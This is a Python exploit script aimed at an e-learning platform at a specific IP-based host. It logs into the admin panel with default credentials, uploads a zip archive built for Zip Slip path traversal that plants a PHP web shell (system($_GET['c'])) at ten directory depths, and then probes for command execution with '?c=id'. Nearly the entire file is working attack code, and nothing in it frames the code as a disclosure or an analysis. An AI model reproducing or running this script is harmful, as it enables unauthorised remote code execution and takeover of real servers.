import requests
import zipfile
import io
import re
import os
import random
import string
import base64
import time

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not match: match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def main():
    if not login(): return

    # Scrape webinar
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    web_id = web_match.group(1) if web_match else "2009"
    
    # Payload: 10 levels of Zip Slip
    shell = "<?php system($_GET['c']); ?>"
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for i in range(1, 11):
            path = "../" * i + f"shell{i}.php"
            z.writestr(path, shell)
        z.writestr('s.php', shell) # No traversal
        
    buf.seek(0)
    
    # Trigger
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    payload = {
        'ajax[new][webinar_id]': web_id, 'ajax[new][chapter_id]': "30",
        'ajax[new][title]': 'Massive Slip ' + rand_name, 'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive', 'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 's.php', 'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    print(f"[*] Triggering massive Zip Slip ({zip_filename})...")
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Response: {r.status_code}")
    
    # Verify
    time.sleep(2)
    # Check all levels at root
    for i in range(1, 11):
        url = f"{BASE_URL}/shell{i}.php"
        res = session.get(url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! shell{i}.php found at root")
            return
            
    # Check in store/
    for i in range(1, 11):
        url = f"{BASE_URL}/store/shell{i}.php"
        res = session.get(url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! shell{i}.php found in /store/")
            return

    # Check in store/1/
    for i in range(1, 11):
        url = f"{BASE_URL}/store/1/shell{i}.php"
        res = session.get(url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! shell{i}.php found in /store/1/")
            return

    print("[-] No shell found in the massive check.")

if __name__ == "__main__":
    main()
